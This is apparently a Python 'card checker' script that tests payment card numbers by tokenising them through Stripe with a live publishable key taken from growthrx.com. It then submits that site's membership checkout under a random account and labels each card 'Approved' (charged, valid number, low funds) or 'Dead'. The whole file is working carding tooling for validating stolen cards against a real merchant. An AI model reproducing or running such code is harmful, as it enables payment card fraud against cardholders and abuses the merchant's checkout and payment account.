from utilsdf.functions import random_proxy, capture, random_email, random_word, clean_text
from httpx import AsyncClient


async def astharoth(cc, month, year, cvv):
    n = random_word(8)
    mail = random_email()

    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        r = await session.get(
            "https://growthrx.com/membership-account/membership-checkout/"
        )

        h2 = {
            "Host": "api.stripe.com",
            "content-type": "application/x-www-form-urlencoded",
        }

        p2 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fgrowthrx.com&time_on_page=38241&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GVWtSAsnQpRziaF"

        r2 = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        pm = capture(t2, '"id": "', '"')
        l4 = capture(t2, '"last4": "', '"')
        fu = capture(t2, '"funding": "', '"')

        h3 = {
            "Host": "growthrx.com",
            "origin": "https://growthrx.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://growthrx.com/membership-account/membership-checkout/",
        }

        p3 = f"level=1&checkjavascript=1&other_discount_code=&username={n}&password=*{n}*&password2=*{n}*&bemail={mail}&bconfirmemail={mail}&fullname=&CardType={fu}&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id={pm}&AccountNumber=XXXXXXXXXXXX{l4}&ExpirationMonth={month}&ExpirationYear={year}"

        r3 = await session.post(
            "https://growthrx.com/membership-account/membership-checkout/",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        msg2 = capture(t3, '"pmpro_message pmpro_error">\n', "\n</div>")
        msg2 = clean_text(msg2)
        msg = capture(msg2, "", " Membership Level")

        if r3.status_code == 200:
            status = "Aproved! ✅ -» charged!"
            msg = "Success! -» $0"
        elif "security code is incorrect" in msg:
            status = "Approved! ✅ -» ccn"
        elif "funds" in msg:
            status = "Approved! ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg
